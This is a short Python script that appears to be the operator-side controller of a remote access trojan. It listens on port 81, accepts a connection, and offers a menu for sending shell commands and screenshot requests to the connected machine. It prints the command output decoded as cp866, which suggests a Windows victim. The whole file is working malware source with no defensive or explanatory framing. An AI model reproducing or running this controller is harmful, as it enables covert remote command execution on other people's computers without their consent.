import socket, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '0.0.0.0'
port = 81
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
while True:
    a = input('/cmd - Сommand line\n/screen - ScreenShot\n > ')
    conn.send(a.encode())
    if a == '/cmd':
        cmd = input('#> ')
        conn.send(cmd.encode())
        cmd_process = conn.recv(5000)
        cmd_process = str(cmd_process, "cp866")
        print(cmd_process)
